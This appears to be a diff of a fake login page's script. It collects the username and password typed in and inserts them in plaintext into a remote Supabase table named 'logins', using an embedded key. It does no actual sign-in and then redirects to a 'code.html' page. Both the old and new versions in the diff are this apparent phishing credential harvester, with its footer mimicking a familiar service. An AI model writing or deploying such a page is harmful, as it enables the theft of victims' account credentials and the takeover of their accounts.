@@ -219,52 +219,58 @@
     <div class="bottom-line">About · Help · More</div>
   </div>
 
-  <script type="module">
-    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
 
-    const supabaseUrl = 'https://scserlwosxrmnvomipxt.supabase.co';
-    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
+  const supabaseUrl = 'https://scserlwosxrmnvomipxt.supabase.co';
+  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNjc2VybHdvc3hybW52b21pcHh0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk4MTI4NzMsImV4cCI6MjA2NTM4ODg3M30.JJtoPSkDqNTAgqpDHNZunqtyECGtYEWKh-YbvipTPH8';
 
-    const supabase = createClient(supabaseUrl, supabaseKey);
+  const supabase = createClient(supabaseUrl, supabaseKey);
 
-    function showError(inputElement) {
-      inputElement.style.borderColor = 'red';
-      const error = document.createElement('div');
-      error.className = 'error-message';
-      error.style.color = 'red';
-      error.style.fontSize = '12px';
-      error.style.marginTop = '4px';
-      error.textContent = 'Required';
-      inputElement.parentNode.appendChild(error);
+  // Expose the function to the global scope
+  window.submitToSupabase = async function () {
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const username = usernameInput.value.trim();
+    const password = passwordInput.value.trim();
+
+    // Clear previous errors
+    document.querySelectorAll('.error-message').forEach(el => el.remove());
+    [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
+
+    if (!username || !password) {
+      if (!username) showError(usernameInput);
+      if (!password) showError(passwordInput);
+      return;
     }
 
-    window.submitToSupabase = async function () {
-      const usernameInput = document.getElementById("username");
-      const passwordInput = document.getElementById("password");
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
+    // Insert into Supabase
+    const { error } = await supabase
+      .from('logins')
+      .insert([{ username, password }]);
 
-      document.querySelectorAll('.error-message').forEach(el => el.remove());
-      [usernameInput, passwordInput].forEach(input => input.style.borderColor = '#ccc');
+    if (error) {
+      console.error("Supabase insert error:", error);
+      alert("Submission failed.");
+      return;
+    }
 
-      let hasError = false;
-      if (!username) { showError(usernameInput); hasError = true; }
-      if (!password) { showError(passwordInput); hasError = true; }
-      if (hasError) return;
+    // Redirect
+    window.location.href = "code.html";
+  };
 
-      const { error } = await supabase
-        .from('logins')
-        .insert([{ username, password }]);
+  function showError(inputElement) {
+    inputElement.style.borderColor = 'red';
+    const error = document.createElement('div');
+    error.className = 'error-message';
+    error.style.color = 'red';
+    error.style.fontSize = '12px';
+    error.style.marginTop = '4px';
+    error.textContent = 'Required';
+    inputElement.parentNode.appendChild(error);
+  }
+</script>
 
-      if (error) {
-        alert("Something went wrong while submitting.");
-        console.error(error);
-        return;
-      }
-
-      window.location.href = "code.html";
-    };
-  </script>
 
 </body>
 </html>
